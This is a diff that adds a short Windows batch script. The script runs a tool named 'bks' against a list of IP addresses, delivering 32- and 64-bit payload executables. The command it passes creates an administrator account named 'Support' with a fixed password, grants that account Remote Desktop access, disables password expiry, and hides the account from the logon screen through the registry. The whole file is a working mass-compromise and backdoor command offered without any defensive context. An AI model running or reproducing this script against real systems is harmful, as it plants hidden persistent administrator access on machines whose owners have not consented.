@@ -1,0 +1,2 @@
+bks -t 20 -ipl iplist.txt -p32 cmd_payload_x86.exe -p64 cmd_payload_x64.exe -cmd "cmd.exe /c net user Support aFUIHH87d1!! /add & net localgroup Administrators Support /add & net localgroup \"Remote Desktop Users\" Support /add & net accounts /maxpwage:unlimited & reg add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList\" /t REG_DWORD /f /d 0 /v Support"
+pause
